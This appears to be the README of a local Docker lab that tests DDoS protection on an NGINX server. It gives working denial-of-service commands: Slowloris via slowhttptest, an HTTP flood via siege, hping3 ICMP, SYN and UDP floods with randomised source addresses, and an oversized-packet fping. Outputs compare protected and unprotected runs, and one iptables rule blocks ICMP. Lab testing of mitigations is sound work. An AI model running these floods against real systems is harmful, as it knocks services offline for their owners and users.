# DDOS

## Installation

```
docker-compose up --build
```

## Attacker Tools
```
docker-compose run kali bash
```

## Testing

### Slowloris
```
slowhttptest -c 2000 -H -g -o slowhttp -i 10 -r 200 -t GET -u ${TARGET_URL} -x 24 -p 3
```

Attack on NGINX server with DDoS protection enabled:
```
initializing:        0
pending:             0
connected:           571
error:               0
closed:              1429
service available:   YES
```

Attack on NGINX server with DDoS protection disabled:
```
initializing:        0
pending:             0
connected:           1029
error:               0
closed:              971
service available:   NO
```

```
curl -XGET http://localhost:5050
curl: (52) Empty reply from server
```

### HTTP Flood
```
siege -b -c 250 -t 3m ${TARGET_URL}
```

Attack on NGINX server with DDoS protection enabled:
```
{       "transactions":                         6656,
        "availability":                        80.05,
        "elapsed_time":                       179.78,
        "data_transferred":                   163.25,
        "response_time":                        0.36,
        "transaction_rate":                    37.02,
        "throughput":                           0.91,
        "concurrency":                         13.16,
        "successful_transactions":              6656,
        "failed_transactions":                  1659,
        "longest_transaction":                  2.91,
        "shortest_transaction":                 0.00
}
```

Attack on NGINX server with DDoS protection disabled:
```
{       "transactions":                       101967,
        "availability":                        99.59,
        "elapsed_time":                       179.61,
        "data_transferred":                  2914.89,
        "response_time":                        0.29,
        "transaction_rate":                   567.71,
        "throughput":                          16.23,
        "concurrency":                        161.81,
        "successful_transactions":            101988,
        "failed_transactions":                   420,
        "longest_transaction":                 16.18,
        "shortest_transaction":                 0.00
}
```

### ICMP Flood
```
hping3 --flood --rand-source -1 -p ${TARGET_PORT} ${TARGET_IP}
```

Block ICMP messaging using ```iptables -A INPUT --proto icmp -j DROP```

### Ping of Daeth
```
fping -b 65500 ${TARGET_IP}
```

### SYN Flood
```
hping3 -c 20000 -d 120 -S -w 64 -p ${TARGET_PORT} --flood --rand-source ${TARGET_IP}
```

### UDP Flood
```
hping3 --flood --rand-source --udp -p ${TARGET_PORT} ${TARGET_IP}
```
